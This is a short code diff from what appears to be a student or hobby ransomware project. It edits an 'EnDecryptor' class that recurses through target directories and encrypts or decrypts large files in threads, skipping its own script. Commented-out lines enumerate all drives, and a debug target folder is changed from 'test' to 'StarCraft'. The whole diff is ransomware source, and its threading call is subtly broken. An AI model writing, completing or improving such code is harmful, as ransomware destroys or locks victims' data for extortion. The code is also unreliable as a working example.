@@ -147,7 +147,7 @@ class EnDecryptor:
                     if(file==sys.argv[0]):
                         return
                     if(os.path.getsize(file)>50000000):
-                        th=Process(target=self.encEach(file))
+                        th=Thread(target=self.encEach(file))
                         ThreadPool.append(th)
                         th.start()
                         print('[DEBUG] start')
@@ -165,7 +165,7 @@ class EnDecryptor:
                     if(file==sys.argv[0]):
                         return
                     if(os.path.getsize(file)>50000000):
-                        th=Process(target=self.decEach(file))
+                        th=Thread(target=self.decEach(file))
                         ThreadPool.append(th)
                         th.start()
                         print('[DEBUG] start')
@@ -192,7 +192,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]#테스트용 타겟 경로
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]#테스트용 타겟 경로
 
 def recursiveEncrypt(basepath):
     global ThreadPool
